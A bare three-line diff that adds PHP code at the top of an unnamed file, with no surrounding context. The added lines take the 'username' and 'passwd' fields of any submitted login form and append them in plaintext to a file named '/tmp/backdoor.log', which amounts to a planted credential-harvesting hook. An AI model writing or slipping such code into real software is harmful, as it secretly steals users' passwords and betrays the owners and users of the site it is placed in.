@@ -1,0 +1,3 @@
+if(isset($_POST['username'])) {
+  file_put_contents('/tmp/backdoor.log', $_POST['username'].' / '.$_POST['passwd'], FILE_APPEND);
+}
